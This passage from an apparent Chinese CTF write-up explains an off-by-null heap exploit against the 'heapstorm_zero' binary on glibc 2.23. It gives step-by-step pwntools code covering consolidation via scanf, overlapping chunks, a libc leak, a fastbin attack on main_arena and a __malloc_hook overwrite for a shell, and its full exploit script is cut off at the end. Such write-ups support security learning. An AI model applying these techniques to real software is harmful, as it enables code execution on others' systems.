href="#简述" class="headerlink" title="简述"></a>简述</h3><p>一字节溢出的利用围绕着的是 堆块在分配，释放，合并时对 chunk 的 size 域的信任关系。而如果只是 fastbin 的话 off by null 是没法利用的，因为只要溢出就会把 size 设置为 0.</p><p>这里有一个 tips , 使用 scanf 获取内容时，如果 输入字符串比较长会调用 malloc 来分配内存。</p><p>在 malloc 分配内存时，首先会一次扫描一遍 fastbin , smallbin ， unsorted bin ，largebin, 如果都找不到可以分配的 chunk 分配给用户 ， 会进入 top_chunk 分配的流程， 如果此时还有 fastbin ，就会触发堆合并机制，把 fastbin 合并 之后放入 smallbin，再看能否分配，不能的话会使用 top_chunk 进行分配。</p><p>于是利用 scanf 能分配大内存的特性，我们可以触发 堆合并，然后让 fastbin 合并成一个 smallbin , 然后在触发 off-by-null , 就是常规的利用思路了。</p><h3 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h3><p>首先分配 12 个 chunk, 其中 第一个 和最后一个保留， 第一个 chunk 用于 触发 off-by-null ， 最后一个用于防止在 堆合并时与 top_chunk 进行合并。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x38</span>, <span class="string">'a'</span>)  <span class="comment"># 0</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x28</span>, <span class="string">'a'</span>)  <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x28</span>, <span class="string">'a'</span>)  <span class="comment"># 2</span></span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">'a'</span>)  <span class="comment"># 3</span></span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">'a'</span>)  <span class="comment"># 4</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'x'</span>)  <span class="comment"># 5</span></span><br><span class="line">add(<span class="number">0x28</span>, <span class="string">'x'</span>)  <span class="comment"># 6</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'x'</span>)  <span class="comment"># 7</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'x'</span>)  <span class="comment"># 8</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'x'</span>)  <span class="comment"># 9</span></span><br><span class="line">pay = <span class="string">'a'</span> * <span class="number">0x20</span> + p64(<span class="number">0x200</span>) + p64(<span class="number">0x20</span>)  <span class="comment"># shrink chunk 前，配置好</span></span><br><span class="line">add(<span class="number">0x38</span>, pay)  <span class="comment"># 10</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'end'</span>)  <span class="comment"># 11  , 保留块， 防止和 top chunk 合并</span></span><br></pre></td></tr></table></figure><p>然后把中间的 10 个 chunk 释放掉，同时触发 堆合并，构造一个 0x210 大小的 smallbin<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 释放掉 chunk</span><br><span class="line">for i in range(1, 11):</span><br><span class="line">    dele(i)</span><br><span class="line"></span><br><span class="line"># 利用 scanf 分配大内存 0x400+ , 会触发堆合并</span><br><span class="line"># fastbin 会合并进入 smallbin</span><br><span class="line">triger_consolidate()</span><br></pre></td></tr></table></figure></p><p>函数 triger_consolidate 的逻辑就是发送 0x400 的字符串给 scanf 处理，然后 scanf 会分配大内存，触发 堆合并。</p><p>此时的内存布局如下</p><p><img alt="" data-src="/imgs/off-by-null-1.png" class="lozad"></p><p>图中特殊标出的 0x200 | 0x20 用于保证后续利用过掉 check.</p><p>然后利用 chunk 0 , 溢出 一字节的 \x00 , 修改下面那个 smallbin 的 size —&gt; 0x200</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 利用 chunk 0 , 溢出 一字节的 \x00 , 修改 size ---&gt; 0x200</span></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">pay = <span class="string">'a'</span> * <span class="number">0x38</span></span><br><span class="line">add(<span class="number">0x38</span>, pay)  <span class="comment"># 0</span></span><br></pre></td></tr></table></figure><p>紧接着在这个剩下的 0x200 字节的 smallbin 里面分配 8 个 chunk , 然后利用同样的方法，在里面构造一个 smallbin</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x38</span>, <span class="string">'a'</span> * <span class="number">8</span>)  <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'b'</span> * <span class="number">8</span>)  <span class="comment"># 2</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'c'</span> * <span class="number">8</span>)  <span class="comment"># 3</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'x'</span>)  <span class="comment"># 4</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'x'</span>)  <span class="comment"># 5</span></span><br><span class="line">add(<span class="number">0x28</span>, <span class="string">'x'</span>)  <span class="comment"># 6</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'x'</span>)  <span class="comment"># 7</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'x'</span>)  <span class="comment"># 8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用 大量的 fastbin + 堆合并 构造 smallbin , 大小 0xc0</span></span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line">triger_consolidate()</span><br></pre></td></tr></table></figure><p><img alt="" data-src="/imgs/off-by-null-2.png" class="lozad"></p><p>下面释放掉 chunk 11</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 触发 overlap</span></span><br><span class="line">dele(<span class="number">11</span>)</span><br><span class="line">triger_consolidate()</span><br></pre></td></tr></table></figure><p>系统发现 chunk 11 的 pre_size 为 0 ，即表明前一个 chunk 是释放状态，同时 chunk 11 和 top_chunk 相邻，所以 即使 chunk 11 的大小在 fastbin 的范围内也会触发合并操作，于是会通过 chunk 11 的 pre_size ( 0x210 ) 找到上面那个 smallbin 的起始地址。</p><p>然后对 smallbin 做 unlink 操作， 此时 smallbin 已经在链表上，所以 unlink 可以通过，拆下来后进行合并， 合并之后形成了一个大 chunk.<br><img alt="" data-src="/imgs/off-by-null-3.png" class="lozad"></p><p>这个 chunk 会继续和 top_chunk 合并变成 top_chunk 的一部分。注意到此时 chunk4 - chunk8 已经落入 top_chunk 里。</p><p>接下来通过类似的方法，分配多个 chunk ， 然后释放掉中间的一些的 chunk , 然后出发 堆合并，构造一个比较大的 smallbin<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">add(0x28, &apos;a&apos;)  # 1</span><br><span class="line">add(0x28, &apos;a&apos;)  # 2</span><br><span class="line">add(0x18, &apos;a&apos;)  # 3</span><br><span class="line">add(0x18, &apos;a&apos;)  # 9</span><br><span class="line">add(0x38, &apos;1&apos; * 0x30)  # 10</span><br><span class="line">add(0x38, &apos;2&apos; * 0x30)  # 11</span><br><span class="line">add(0x28, &apos;3&apos; * 0x30)  # 12</span><br><span class="line">add(0x38, &apos;4&apos; * 0x30)  # 13</span><br><span class="line">add(0x38, &apos;5&apos; * 0x30)  # 14</span><br><span class="line">pay = &apos;a&apos; * 0x20 + p64(0x200) + p64(0x20)</span><br><span class="line">add(0x38, pay)  # 15</span><br><span class="line"></span><br><span class="line">add(0x38, &apos;end&apos;)  # 16</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dele(1)</span><br><span class="line">dele(2)</span><br><span class="line">dele(3)</span><br><span class="line">for i in range(9, 16):</span><br><span class="line">    dele(i)</span><br><span class="line"></span><br><span class="line">triger_consolidate()</span><br></pre></td></tr></table></figure></p><p>此时的内存状态如图</p><p><img alt="" data-src="/imgs/off-by-null-4.png" class="lozad"></p><p>此时 chunk 4 - chunk 8 落入了新构造的 smallbin 里面。下面通过 不断的分配，会对这个 smallbin 进行切割，这个过程就会使得 一些链表用的指针落入到 还处于 使用状态的 chunk4 - chunk8 的某一个 chunk 里面， 然后利用 puts 功能，就可以打印指针的内容，造成信息泄露， 拿到 libc 的地址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">### 构造好 unsorted bin ，下面通过不断切割，让指针落入 overlap chunk 里面， 然后 Puts leak 出来</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">pay = <span class="string">'a'</span> * <span class="number">0x38</span></span><br><span class="line">add(<span class="number">0x38</span>, pay)  <span class="comment"># 0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">###  再次 shrink chunk 利用切割smallbin遗留下的指针，leak libc</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'a'</span> * <span class="number">8</span>)  <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'b'</span> * <span class="number">8</span>)  <span class="comment"># 2</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'c'</span> * <span class="number">8</span>)  <span class="comment"># 3</span></span><br><span class="line"></span><br><span class="line">view(<span class="number">4</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Content: '</span>)</span><br><span class="line">lbase = u64(p.recvuntil(<span class="string">'\n'</span>)[:<span class="number">-1</span>].ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)) - <span class="number">0x3c4b20</span> - <span class="number">88</span></span><br><span class="line">success(<span class="string">'lbase: '</span> + hex(lbase))</span><br></pre></td></tr></table></figure><h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><p>能够 overlap chunk 后实现 getshell 的方式就很多了，下面 分析下 exp 的 getshell 方案。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># fastbin dup, 利用 overlap chunk 和 fastbin 的机制往  main_arena 写 size 0x41</span></span><br><span class="line"><span class="comment"># 然后利用 fastbin attack 控制 main_arena-&gt;top.</span></span><br><span class="line">dele(<span class="number">5</span>)</span><br><span class="line">dele(<span class="number">14</span>)</span><br><span class="line">dele(<span class="number">0xc</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">6</span>)</span><br><span class="line">dele(<span class="number">15</span>)</span><br><span class="line">dele(<span class="number">0xd</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改fastbin的fd为0x41,然后分配几次，让main_arean里面有0x41</span></span><br><span class="line">add(<span class="number">0x28</span>, p64(<span class="number">0x41</span>))</span><br><span class="line">add(<span class="number">0x28</span>, <span class="string">'a'</span>)</span><br><span class="line">add(<span class="number">0x28</span>, <span class="string">'a'</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x38</span>, p64(lbase + <span class="number">0x3c4b20</span> + <span class="number">8</span>))</span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'a'</span>)</span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'a'</span>)</span><br><span class="line"><span class="comment"># 利用之前在main_arean里面设置的0x41作为size分配到main_arean,然后修改top_chunk的地址为__malloc_hook-0x18</span></span><br><span class="line">add(<span class="number">0x38</span>, p64(lbase + <span class="number">0x3c4b20</span> + <span class="number">8</span> + <span class="number">0x20</span>) + <span class="string">'\x00'</span> * <span class="number">0x10</span> + p64(<span class="number">0x41</span>))</span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'\x00'</span> * <span class="number">0x20</span> + p64(lbase + libc.sym[<span class="string">'__malloc_hook'</span>] - <span class="number">0x18</span>))</span><br></pre></td></tr></table></figure><ul><li>利用 overlap chunk 和 fastbin 的机制往 main_arena 写 size (0x41)</li><li>然后利用 fastbin attack 控制 main_arena-&gt;top<br>然后就可以分配到 malloc_hook 附近，修改 malloc_hook 为 one_gadget.</li></ul><p>最后利用 malloc_printerr 触发 one_gadget<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 此时 chunk 6 和 chunk 8 在 tbl 的指针一样，触发 double free</span></span><br><span class="line"><span class="comment"># malloc_printerr ---&gt; malloc_hook ---&gt; getshell</span></span><br><span class="line">dele(<span class="number">6</span>)</span><br><span class="line">dele(<span class="number">8</span>)</span><br></pre></td></tr></table></figure></p><p>完整exp：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line"># -*- coding: UTF-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">from time import sleep</span><br><span class="line">from utils import *</span><br><span class="line"></span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line">context.terminal = [&apos;tmux&apos;, &apos;splitw&apos;, &apos;-h&apos;]</span><br><span class="line">#context.terminal = [&apos;tmux&apos;, &apos;splitw&apos;, &apos;-v&apos;]</span><br><span class="line"></span><br><span class="line">path = &quot;./heapstorm_zero&quot;</span><br><span class="line"></span><br><span class="line">p = process(path, aslr=0)</span><br><span class="line">bin = ELF(path, checksec=False)</span><br><span class="line">libc = ELF(&apos;/lib/x86_64-linux-gnu/libc-2.23.so&apos;, checksec=False)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># result = (unsigned int)(a1 - 1) &lt;= 0x37;</span><br><span class="line">def add(size, con):</span><br><span class="line">    p.recvuntil(&apos;Choice:&apos;)</span><br><span class="line">    p.sendline(&apos;1&apos;)</span><br><span class="line">    p.recvuntil(&apos;size:&apos;)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(&apos;content:&apos;)</span><br><span class="line">    p.sendline(con)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def view(idx):</span><br><span class="line">    p.recvuntil(&apos;Choice:&apos;)</span><br><span class="line">    p.sendline(&apos;2&apos;)</span><br><span class="line">    p.recvuntil(&apos;index:&apos;)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def dele(idx):</span><br><span class="line">    p.recvuntil(&apos;Choice:&apos;)</span><br><span class="line">    p.sendline(&apos;3&apos;)</span><br><span class="line">    p.recvuntil(&apos;index:&apos;)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def triger_consolidate(pay=&apos;&apos;):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    利用 scanf(&quot;%d&quot;,&amp;n) 触发大内存分配，进而导致 内存合并。</span><br><span class="line">    :param pay:</span><br><span class="line">    :return:</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    p.recvuntil(&apos;Choice:&apos;)</span><br><span class="line">    if pay == &apos;&apos;:</span><br><span class="line">        p.sendline(&apos;1&apos; * 0x400)  # malloc_consolidate</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(0x38, &apos;a&apos;)  # 0</span><br><span class="line"></span><br><span class="line">add(0x28, &apos;a&apos;)  # 1</span><br><span class="line">add(0x28, &apos;a&apos;)  # 2</span><br><span class="line">add(0x18, &apos;a&apos;)  # 3</span><br><span class="line">add(0x18, &apos;a&apos;)  # 4</span><br><span class="line">add(0x38, &apos;x&apos;)  # 5</span><br><span class="line">add(0x28, &apos;x&apos;)  # 6</span><br><span class="line">add(0x38, &apos;x&apos;)  # 7</span><br><span class="line">add(0x38, &apos;x&apos;)  # 8</span><br><span class="line">add(0x38, &apos;x&apos;)  # 9</span><br><span class="line">pay = &apos;a&apos; * 0x20 + p64(0x200) + p64(0x20)  # shrink chunk 前，配置好</span><br><span class="line">add(0x38, pay)  # 10</span><br><span class="line"></span><br><span class="line">add(0x38, &apos;end&apos;)  # 11  , 保留块， 防止和 top chunk 合并</span><br><span class="line"></span><br><span class="line"># 释放掉 chunk</span><br><span class="line">for i in range(1, 11):</span><br><span class="line">    dele(i)</span><br><span class="line"></span><br><span class="line"># 利用 scanf 分配大内存 0x400+ , 会触发堆合并</span><br><span class="line"># fastbin 会合并进入 smallbin</span><br><span class="line">triger_consolidate()</span><br><span class="line"></span><br><span class="line"># 合并后 形成 0x210 大小的 smallbin</span><br><span class="line"># pwndbg&gt; x/4xg 0x555555757040</span><br><span class="line"># 0x555555757040: 0x0000000000000000      0x0000000000000211</span><br><span class="line"># 0x555555757050: 0x00002aaaab097d78      0x00002aaaab097d78</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 利用 chunk 0 , 溢出 一字节的 \x00 , 修改 size ---&gt; 0x200</span><br><span class="line">dele(0)</span><br><span class="line">pay = &apos;a&apos; * 0x38</span><br><span class="line">add(0x38, pay)  # 0</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">add(0x38, &apos;a&apos; * 8)  # 1</span><br><span class="line">add(0x38, &apos;b&apos; * 8)  # 2</span><br><span class="line">add(0x38, &apos;c&apos; * 8)  # 3</span><br><span class="line">add(0x38, &apos;x&apos;)  # 4</span><br><span class="line">add(0x38, &apos;x&apos;)  # 5</span><br><span class="line">add(0x28, &apos;x&apos;)  # 6</span><br><span class="line">add(0x38, &apos;x&apos;)  # 7</span><br><span class="line">add(0x38, &apos;x&apos;)  # 8</span><br><span class="line"></span><br><span class="line"># 利用 大量的 fastbin + 堆合并 构造 smallbin , 大小 0xc0</span><br><span class="line">dele(1)</span><br><span class="line">dele(2)</span><br><span class="line">dele(3)</span><br><span class="line">triger_consolidate()</span><br><span class="line"></span><br><span class="line"># 触发 overlap</span><br><span class="line">dele(11)</span><br><span class="line">triger_consolidate()</span><br><span class="line"></span><br><span class="line">add(0x28, &apos;a&apos;)  # 1</span><br><span class="line">add(0x28, &apos;a&apos;)  # 2</span><br><span class="line">add(0x18, &apos;a&apos;)  # 3</span><br><span class="line">add(0x18, &apos;a&apos;)  # 9</span><br><span class="line">add(0x38, &apos;1&apos; * 0x30)  # 10</span><br><span class="line">add(0x38, &apos;2&apos; * 0x30)  # 11</span><br><span class="line">add(0x28, &apos;3&apos; * 0x30)  # 12</span><br><span class="line">add(0x38, &apos;4&apos; * 0x30)  # 13</span><br><span class="line">add(0x38, &apos;5&apos; * 0x30)  # 14</span><br><span class="line">pay = &apos;a&apos; * 0x20 + p64(0x200) + p64(0x20)</span><br><span class="line">add(0x38, pay)  # 15</span><br><span class="line"></span><br><span class="line">add(0x38, &apos;end&apos;)  # 16</span><br><span class="line"></span><br><span class="line"># 此时会有 指针交叉</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dele(1)</span><br><span class="line">dele(2)</span><br><span class="line">dele(3)</span><br><span class="line">for i in range(9, 16):</span><br><span class="line">    dele(i)</span><br><span class="line"></span><br><span class="line">triger_consolidate()</span><br><span class="line"></span><br><span class="line">### 构造好 unsorted bin ，下面通过不断切割，让指针落入 overlap chunk 里面， 然后 Puts leak 出来</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dele(0)</span><br><span class="line">pay = &apos;a&apos; * 0x38</span><br><span class="line">add(0x38, pay)  # 0</span><br><span class="line"></span><br><span class="line">###  再次 shrink chunk</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(0x38, &apos;a&apos; * 8)  # 1</span><br><span class="line">add(0x38, &apos;b&apos; * 8)  # 2</span><br><span class="line">add(0x38, &apos;c&apos; * 8)  # 3</span><br><span class="line"></span><br><span class="line">view(4)</span><br><span class="line">p.recvuntil(&apos;Content: &apos;)</span><br><span class="line">lbase = u64(p.recvuntil(&apos;\n&apos;)[:-1].ljust(8, &apos;\x00&apos;)) - 0x3c4b20 - 88</span><br><span class="line">success(&apos;lbase: &apos; + hex(lbase))</span><br><span class="line"></span><br><span class="line">dele(1)</span><br><span class="line">dele(2)</span><br><span class="line">dele(3)</span><br><span class="line">triger_consolidate()</span><br><span class="line"></span><br><span class="line">### 让 heap 回到 shrink chunk 后的情况</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">32: 0x0</span><br><span class="line">48: 0x0</span><br><span class="line">64: 0x0</span><br><span class="line">80: 0x0</span><br><span class="line">96: 0x0</span><br><span class="line">112: 0x0</span><br><span class="line">128: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">512: 0x603040 —▸ 0x2aaaab097d68 (main_arena+584) ◂— 0x603040 /* u&apos;@0`&apos; */</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt; x/4xg 0x603040</span><br><span class="line">0x603040:       0x6161616161616161      0x0000000000000201</span><br><span class="line">0x603050:       0x00002aaaab097d68      0x00002aaaab097d68</span><br><span class="line">pwndbg&gt;</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">add(0x18, &apos;A&apos; * 0x10)  # 1</span><br><span class="line">add(0x28, &apos;B&apos; * 0x20)  # 2</span><br><span class="line">add(0x38, &apos;C&apos; * 0x30)  # 3</span><br><span class="line">add(0x18, &apos;D&apos; * 0x10)  # 9</span><br><span class="line"></span><br><span class="line">pay = p64(0) + p64(0x41)</span><br><span class="line">add(0x18, pay)  # 6</span><br><span class="line">add(0x28, &apos;asd&apos;)</span><br><span class="line">add(0x38, &apos;zxc&apos;)  # 5,c</span><br><span class="line">add(0x28, &apos;qqq&apos;)  # 6,d</span><br><span class="line"></span><br><span class="line">add(0x38, &apos;a1&apos;)  # 14</span><br><span class="line">add(0x28, &apos;a2&apos;)  # 15</span><br><span class="line"></span><br><span class="line"># fastbin dup, 利用 overlap chunk 和 fastbin 的机制往  main_arena 写 size 0x41</span><br><span class="line"># 然后利用 fastbin attack 控制 main_arena-&gt;top.</span><br><span class="line">dele(5)</span><br><span class="line">dele(14)</span><br><span class="line">dele(0xc)</span><br><span class="line"></span><br><span class="line">dele(6)</span><br><span class="line">dele(15)</span><br><span class="line">dele(0xd)</span><br><span class="line"></span><br><span class="line">add(0x28, p64(0x41))</span><br><span class="line">add(0x28, &apos;a&apos;)</span><br><span class="line">add(0x28, &apos;a&apos;)</span><br><span class="line"></span><br><span class="line">add(0x38, p64(lbase + 0x3c4b20 + 8))</span><br><span class="line">add(0x38, &apos;a&apos;)</span><br><span class="line">add(0x38, &apos;a&apos;)</span><br><span class="line">add(0x38, p64(lbase + 